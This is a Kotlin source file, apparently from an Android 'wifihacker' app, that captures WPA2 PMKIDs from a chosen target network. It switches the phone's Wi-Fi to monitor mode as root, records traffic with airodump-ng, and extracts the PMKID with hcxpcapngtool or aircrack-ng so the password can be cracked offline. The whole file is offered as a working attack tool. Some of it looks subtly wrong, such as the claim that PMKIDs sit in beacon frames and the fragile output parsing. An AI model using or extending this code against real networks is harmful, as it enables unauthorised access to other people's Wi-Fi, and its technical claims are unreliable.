package com.peagents.wifihacker.engine

import android.content.Context
import com.peagents.wifihacker.model.NetworkInfo
import kotlinx.coroutines.*
import java.io.File

/**
 * Captura de PMKID sin necesidad de cliente conectado.
 * Funciona con WPA2 y algunas implementaciones WPA3.
 *
 * PMKID = HMAC-SHA1(PMK, A3 || A2) donde:
 *   A3 = BSSID del AP
 *   A2 = 00:00:00:00:00:00 (sin cliente)
 *
 * Si el AP expone PMKID en el beacon/probe response,
 * podemos crackear offline sin deauth ni handshake.
 */
class PMKIDCapturer(
    private val context: Context,
    private val shell: RootShell
) {

    data class PMKIDResult(
        val bssid: String,
        val ssid: String,
        val pmkidHex: String,
        val capturedAt: Long = System.currentTimeMillis()
    )

    suspend fun capture(target: NetworkInfo): PMKIDResult? = withContext(Dispatchers.IO) {
        val iface = shell.getWiFiInterface()

        // Set monitor mode
        shell.setMonitorMode(iface)
        shell.setChannel(iface, target.channel)
        delay(1000)

        try {
            // Use airodump-ng to capture beacon frames (PMKID is in beacon)
            val captureFile = File(context.cacheDir, "pmkid_${target.bssid.replace(":", "")}.pcap")
            val proc = ProcessBuilder(
                "su", "-c",
                "timeout 10 airodump-ng --ch ${target.channel} -w ${captureFile.absolutePath} $iface"
            ).redirectErrorStream(true).start()

            proc.waitFor()
            delay(500)

            // Extract PMKID using hcxpcapngtool or aircrack-ng
            val pmkidFile = File(context.cacheDir, "pmkid_${target.bssid.replace(":", "")}.hcx")

            shell.exec(
                "hcxpcapngtool",
                listOf("--pmkid", "--out", pmkidFile.absolutePath, captureFile.absolutePath),
                timeoutSec = 10
            )

            if (pmkidFile.exists() && pmkidFile.length() > 0) {
                val content = pmkidFile.readText().trim()
                // Format: BSSID:SSID:PMKID_HEX
                val parts = content.split(":")
                if (parts.size >= 3) {
                    return@withContext PMKIDResult(
                        bssid = target.bssid,
                        ssid = target.ssid,
                        pmkidHex = parts[2]
                    )
                }
            }

            // Fallback: use aircrack-ng --write-essid
            val essidFile = File(context.cacheDir, "essid_tmp.txt")
            essidFile.writeText(target.ssid)

            val acResult = shell.exec(
                "aircrack-ng",
                listOf("--write-essid", essidFile.absolutePath, captureFile.absolutePath),
                timeoutSec = 10
            )

            val pmkidMatch = Regex("""PMKID: ([0-9A-Fa-f]+)""").find(acResult.stdout)
            if (pmkidMatch != null) {
                return@withContext PMKIDResult(
                    bssid = target.bssid,
                    ssid = target.ssid,
                    pmkidHex = pmkidMatch.groupValues[1]
                )
            }

            null

        } finally {
            shell.setManagedMode(iface)
        }
    }
}
